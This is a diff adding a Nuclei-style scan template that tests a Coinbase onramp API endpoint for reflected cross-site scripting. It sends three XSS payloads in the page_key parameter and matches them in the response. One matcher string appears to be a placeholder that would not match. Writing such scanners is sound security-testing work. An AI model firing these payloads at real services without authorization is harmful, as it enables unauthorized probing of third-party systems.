@@ -1,0 +1,60 @@
+id: custom-xss-coinbase-api
+
+info:
+  name: Coinbase API XSS Vulnerability Check
+  author: whitehat-ai
+  severity: high
+  description: Tests for cross-site scripting vulnerabilities in Coinbase API endpoints with parameter reflection analysis
+  tags: xss,cross-site-scripting,api-security
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/onramp/v1/buy/transactions?page_key=<script>alert(1)</script>"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "<script>alert(1)</script>"
+          - "alert(1)"
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        regex:
+          - "(<script.*?alert\\(1\\).*?<\\/script>)"
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/onramp/v1/buy/transactions?page_key=\"><img/src=x onerror=alert(1)>"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "<img src=x onerror=alert(1)"
+          - "onerror=alert(1)"
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        regex:
+          - "(<img.*?src=x.*?onerror=alert\\(1\\).*?>)"
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/onramp/v1/buy/transactions?page_key=%27-%3E%3Cscript%3Ealert%28document.domain%29%3B%3C/script%3E"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "alert(document.domain)"
+          - "<script>...</script>"
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        regex:
+          - "(<script.*?alert\\(document\\.domain\\).*?<\\/script>)"
